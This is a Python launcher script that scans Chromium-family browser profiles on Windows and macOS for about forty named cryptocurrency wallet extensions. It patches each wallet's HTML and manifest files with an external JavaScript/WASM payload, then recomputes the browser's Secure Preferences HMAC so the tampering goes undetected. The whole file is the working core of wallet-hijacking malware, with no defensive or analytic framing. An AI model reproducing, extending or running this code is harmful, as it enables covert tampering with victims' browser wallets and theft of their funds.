#!/usr/bin/env python3
"""
Launcher: scan all Chromium browsers, profiles, and wallet extension IDs,
then delegate patching to the libhmac library.
"""

from __future__ import annotations

import argparse
import getpass
import json
import logging
import os
import sys
from pathlib import Path
from typing import Dict, List, Set, Tuple

# Allow running before `pip install` (dev: src layout on PYTHONPATH).
_ROOT = Path(__file__).resolve().parent
_SRC = _ROOT / "src"
if _SRC.is_dir() and str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

from libhmac import PatchTarget, PrefHashCalculator, patch_extension_target, patch_profile
from libhmac.device import normalize_browser_name, require_supported_platform

# Wallet extension IDs (Chrome Web Store + Edge variants).
WALLET_NAMES: dict[str, str] = {
    "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet",
    "hifafgmccdpekplomjjkcfgodnhcellj": "Crypto.com DeFi Wallet",
    "aholpfdialjgjfhomihkjbmgjidlcdno": "Exodus",
    "efbglgofoippbgcjepnhiblaibcnclgk": "Martian Wallet",
    "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
    "mcohilncbfahbmgdjkbpemcciiolgcge": "OKX Wallet",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
    "fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin Wallet",
    "egjidjbpglichdcondbcbdnbeeppgdph": "Trust Wallet",
    "ajkhoeiiokighlmdnlakpjfoobnjinie": "Trust Wallet (Edge)",
    "hmeobnfnfcmdkdcmlblgagmfpfboieaf": "Ctrl Wallet",
    "dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
    "mkpegjkblkkefacfnmkajcjmabijhclg": "Magic Eden",
    "phkbamefinggmakgklpkljjmgibohnba": "Pontem Wallet",
    "acmacodkjbdgmoleebolmdjonilkdbch": "Rabby Wallet",
    "lgmpcpglpngdoalbgeoldeajfclnhafa": "SafePal",
    "bhhhlbepdkbapadjdnnojkbgioiodbic": "Solflare",
    "omaabbefbmiijedngplfjmnooppbclkk": "TonKeeper",
    "nnpmfplkfogfpmcngplhnbdnnilmcdcg": "Uniswap Extension",
    "klghhnkeealcohjjanjjdaeeggmfmlpl": "Zerion Wallet",
    "ejbalbakoplchlghecdalmeeeajnimhm": "MetaMask (Edge)",
    "pbpjkcldjiffchgbbndmhojiacbgflha": "OKX Wallet (Edge)",
    "ocodgmmffbkkeecmadcijjhkmeohinei": "Keplr (Edge)",
    "apenkfbbpmhihehmihndmmcdanacolnh": "SafePal (Edge)",
    "aflkmfhebedbjioipglgcbcmnbpgliof": "Backpack",
    "aeachknmefphepccionboohckonoeemg": "Coin98 Wallet",
    "ejjladinnckdgjemekebdpeokbikhfci": "Petra Wallet",
    "dlcobpjiigpikoobohmabehhmhfoodbb": "Argent X",
    "khpkpbbcccdmmclmpigdgddabeilkdpd": "Suiet Wallet",
    "idnnbdplmphpflfnlkomgpfbpcgelopg": "Xverse Wallet",
    "onhogfjeacnfoofkfgppdlbmlmnplgbn": "SubWallet",
    "gjnckgkfmgmibbkoficdidcljeaaaheg": "Atomic Wallet",
    "pdliaogehgdbhbnmkklieghmmjkpigpa": "Bybit Wallet",
    "jiidiaalihmmhddjgbnbgdfflelocpak": "Bitget Wallet",
    "afbcbjpbpfadlkmhmclhkeeodmamcflc": "MathWallet",
    "mfgccjchihfkkindfppnaooecgfneiii": "TokenPocket",
    "kkpllkodjeloidieedojogacfhpaihoh": "Enkrypt",
    "opfgelmcmbiajamepnmloijbpoleiama": "Rainbow",
    "ldinpeekobnhjjdofggfgjlcehhmanlj": "Leather",
}


def profile_supports_unpacked(profile_name: str) -> bool:
    if not profile_name:
        return False
    if profile_name in ("Guest Profile", "System Profile"):
        return False
    return True


def get_chromium_browser_paths(username: str) -> Dict[str, str]:
    if os.name == "nt":
        return {
            "Chrome": rf"C:\Users\{username}\AppData\Local\Google\Chrome\User Data",
            "Chrome-Beta": rf"C:\Users\{username}\AppData\Local\Google\Chrome Beta\User Data",
            "Chrome-Dev": rf"C:\Users\{username}\AppData\Local\Google\Chrome Dev\User Data",
            "Chrome-Canary": rf"C:\Users\{username}\AppData\Local\Google\Chrome SxS\User Data",
            "Edge": rf"C:\Users\{username}\AppData\Local\Microsoft\Edge\User Data",
            "Edge-Beta": rf"C:\Users\{username}\AppData\Local\Microsoft\Edge Beta\User Data",
            "Brave": rf"C:\Users\{username}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            "Opera": rf"C:\Users\{username}\AppData\Roaming\Opera Software\Opera Stable",
            "OperaGX": rf"C:\Users\{username}\AppData\Roaming\Opera Software\Opera GX Stable",
            "Vivaldi": rf"C:\Users\{username}\AppData\Local\Vivaldi\User Data",
            "Chromium": rf"C:\Users\{username}\AppData\Local\Chromium\User Data",
            "Yandex": rf"C:\Users\{username}\AppData\Local\Yandex\YandexBrowser\User Data",
        }
    if sys.platform == "darwin":
        return {
            "Chrome": f"/Users/{username}/Library/Application Support/Google/Chrome",
            "Chrome-Beta": f"/Users/{username}/Library/Application Support/Google/Chrome Beta",
            "Edge": f"/Users/{username}/Library/Application Support/Microsoft Edge",
            "Brave": f"/Users/{username}/Library/Application Support/BraveSoftware/Brave-Browser",
            "Opera": f"/Users/{username}/Library/Application Support/com.operasoftware.Opera",
            "Vivaldi": f"/Users/{username}/Library/Application Support/Vivaldi",
            "Chromium": f"/Users/{username}/Library/Application Support/Chromium",
        }
    return {}


def enumerate_profile_directories(browser_path: str) -> List[str]:
    found: Set[str] = set()
    local_state = os.path.join(browser_path, "Local State")
    if os.path.isfile(local_state):
        try:
            with open(local_state, "r", encoding="utf-8") as f:
                ls = json.load(f)
            ic = (ls.get("profile") or {}).get("info_cache")
            if isinstance(ic, dict):
                for name in ic:
                    if isinstance(name, str) and name:
                        if os.path.isfile(os.path.join(browser_path, name, "Preferences")):
                            found.add(name)
        except (OSError, json.JSONDecodeError):
            pass
    try:
        for item in os.listdir(browser_path):
            item_path = os.path.join(browser_path, item)
            if os.path.isdir(item_path) and os.path.isfile(
                os.path.join(item_path, "Preferences")
            ):
                found.add(item)
    except OSError:
        pass

    def _sort_key(n: str) -> Tuple[int, str]:
        if n == "Default":
            return (0, "")
        if n == "Guest Profile":
            return (2, n)
        if n == "System Profile":
            return (4, n)
        return (1, n.lower())

    return sorted(found, key=_sort_key)


def find_all_browser_profiles(username: str) -> Dict[str, dict]:
    result: Dict[str, dict] = {}
    for browser_name, browser_path in get_chromium_browser_paths(username).items():
        if not os.path.isdir(browser_path):
            continue
        profiles = enumerate_profile_directories(browser_path)
        if profiles:
            result[browser_name] = {"path": browser_path, "profiles": profiles}
    return result


def find_extension_version_dirs(profile_path: str, ext_id: str) -> List[str]:
    ext_root = os.path.join(profile_path, "Extensions", ext_id)
    if not os.path.isdir(ext_root):
        return []
    results: List[str] = []
    for d in os.listdir(ext_root):
        vpath = os.path.join(ext_root, d)
        if os.path.isdir(vpath) and os.path.isfile(os.path.join(vpath, "manifest.json")):
            results.append(vpath)
    return results


def scan_wallet_targets(username: str, wallet_ids: Dict[str, str]) -> List[PatchTarget]:
    targets: List[PatchTarget] = []
    browsers = find_all_browser_profiles(username)

    for browser_name, info in browsers.items():
        browser_path = info["path"]
        browser_key = normalize_browser_name(browser_name)

        for profile_name in info["profiles"]:
            if not profile_supports_unpacked(profile_name):
                continue
            profile_path = os.path.join(browser_path, profile_name)

            for ext_id, wallet_name in wallet_ids.items():
                for vdir in find_extension_version_dirs(profile_path, ext_id):
                    targets.append(
                        PatchTarget(
                            browser_name=browser_name,
                            browser_key=browser_key,
                            profile_name=profile_name,
                            profile_path=profile_path,
                            extension_id=ext_id,
                            wallet_name=wallet_name,
                            version_dir=vdir,
                        )
                    )
    return targets


def setup_logging(verbose: bool) -> None:
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)s %(message)s",
    )


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Scan browsers/profiles/wallets and patch via libhmac",
    )
    parser.add_argument("--username", help="OS username (default: current user)")
    parser.add_argument(
        "--skip-prefs",
        action="store_true",
        help="Only patch extension files; skip Secure/Preferences HMAC",
    )
    parser.add_argument(
        "--payload-dir",
        help="Directory with dm_core_bg.js and dm_core_bg.wasm (default: package data)",
    )
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    setup_logging(args.verbose)

    try:
        require_supported_platform()
    except RuntimeError as e:
        print(e, file=sys.stderr)
        return 2

    username = args.username or getpass.getuser()
    calculator = PrefHashCalculator()

    browsers = find_all_browser_profiles(username)
    if not browsers:
        logging.error("No Chromium browser profiles found for user %s", username)
        return 1

    logging.info("Browsers with profiles: %s", ", ".join(browsers.keys()))

    targets = scan_wallet_targets(username, WALLET_NAMES)
    if not targets:
        logging.warning("No installed wallet extensions found to patch")
        return 1

    logging.info("Found %d extension version(s) to patch", len(targets))

    ok_count = 0
    for target in targets:
        logging.info(
            "Patching %s | %s/%s | %s",
            target.wallet_name,
            target.browser_name,
            target.profile_name,
            target.version_dir,
        )
        result = patch_extension_target(
            target,
            calculator,
            payload_dir=args.payload_dir,
        )
        if result.ok:
            ok_count += 1
            logging.info(
                "  OK: html=%d manifest=%s",
                result.html_files_patched,
                result.manifest_patched,
            )
        else:
            logging.error("  FAIL: %s", result.error or "unknown")

    if not args.skip_prefs:
        patched_profiles: set[str] = set()
        for target in targets:
            key = target.profile_path
            if key in patched_profiles:
                continue
            patched_profiles.add(key)
            secure_mod, prefs_mod = patch_profile(
                target.profile_path,
                target.browser_key,
                calculator,
            )
            logging.info(
                "Profile prefs %s/%s: secure=%s preferences=%s",
                target.browser_name,
                target.profile_name,
                secure_mod,
                prefs_mod,
            )

    logging.info("Done: %d/%d extension dirs patched", ok_count, len(targets))
    return 0 if ok_count > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
